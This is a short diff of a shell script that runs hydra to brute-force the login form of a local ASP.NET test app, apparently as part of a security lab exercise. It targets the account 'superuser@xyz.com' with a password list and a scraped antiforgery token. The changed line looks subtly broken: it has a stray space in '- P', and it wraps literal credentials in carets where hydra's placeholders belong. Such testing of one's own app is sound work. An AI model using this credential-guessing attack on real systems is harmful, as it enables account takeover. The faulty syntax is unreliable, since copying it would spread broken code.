@@ -10,4 +10,4 @@ SESSIONNAME=$(grep .AspNetCore.Antiforgery WebSecurity.cookie | awk -F ' ' '{pri
 
 hydra -l superuser@xyz.com - P /WebSecurity/passwords.txt \
 	-F -V -t 64 localhost http-post-form \
-	"/WebSecurity/Login:Input.Email=superuser@xyz.com&Input.Password=Abc@1234&_RequestVerificationToken=$(CSRF)&Input.RememberMe=false:S=Location\: /:H=Cookie: "
+	"/WebSecurity/Login:Input.Email=^superuser@xyz.com^&Input.Password=^Abc@1234^&_RequestVerificationToken=$(CSRF)&Input.RememberMe=false:S=Location\: /:H=Cookie: "
